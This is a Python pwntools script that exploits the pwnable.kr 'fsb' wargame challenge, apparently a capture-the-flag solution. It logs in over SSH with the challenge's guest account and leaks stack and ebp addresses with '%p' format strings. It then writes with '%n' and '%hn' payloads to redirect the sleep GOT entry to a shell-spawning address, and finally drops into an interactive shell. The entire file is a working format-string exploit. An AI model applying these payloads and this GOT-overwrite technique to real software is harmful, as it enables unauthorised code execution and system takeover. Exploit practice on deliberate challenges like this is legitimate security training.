#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    addr = raw_input("DEBUG: ")
    #  gdb.attach(io, "b *" + str(addr))
    gdb.attach(io, "b *fsb+220")

if sys.argv[1] == "l":
    io = process("./fsb")
else:
    io = ssh(user = "fsb", host = "pwnable.kr", port = 2222, password = "guest").run("./fsb")

sh_addr = 0x0804869f
elf = ELF("./fsb")
sleep_got = elf.got["sleep"]

log.info("Step 1: junk data")
io.sendlineafter("(1)\n", "M4x")

log.info("Step 2: leak stack and ebp")
payload = "%14$p..%18$p.."
io.sendlineafter("(2)\n", payload)
esp = int(io.recvuntil("..", drop = True), 16) - 0x50
ebp = int(io.recvuntil("..", drop = True), 16)
offset = (ebp - esp) / 4
log.success("esp -> 0x%x" % esp)
log.success("ebp -> 0x%x" % ebp)

log.info("Step 3: hijack sleep_got to ebp")
payload = "%" + str(sleep_got) + "c%18$n"
#  print payload
#  debug()
io.sendlineafter("(3)\n", payload)

log.info("Step 4: hijack sh_addr to sleep_got")
payload = "%" + str(sh_addr & 0xffff) + "c%" + str(offset) + "$hn"
#  print payload
io.sendlineafter("(4)\n", payload)


#  sleep(4)
io.interactive()
io.close()
